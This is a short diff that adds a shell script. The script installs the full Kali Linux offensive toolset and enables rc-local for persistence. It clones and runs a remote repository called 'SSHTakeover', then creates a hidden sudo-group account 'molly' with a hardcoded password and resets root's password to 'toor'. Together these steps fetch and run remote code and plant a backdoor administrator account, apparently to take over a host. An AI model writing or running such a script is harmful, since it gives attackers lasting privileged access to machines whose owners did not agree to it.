@@ -1,0 +1,10 @@
+#!/bin/sh
+apt install sudo kali-linux-everything -y;
+sudo systemctl enable rc-local;
+git clone https://github.com/independentcod/SSHTakeover >>/dev/stdout;
+cd SSHTakeover;
+sh takeover.sh >>/dev/stdout;
+sudo useradd -m molly;
+echo molly:eskam123 | sudo chpasswd;
+sudo usermod -g sudo molly;
+echo root:toor | sudo chpasswd;
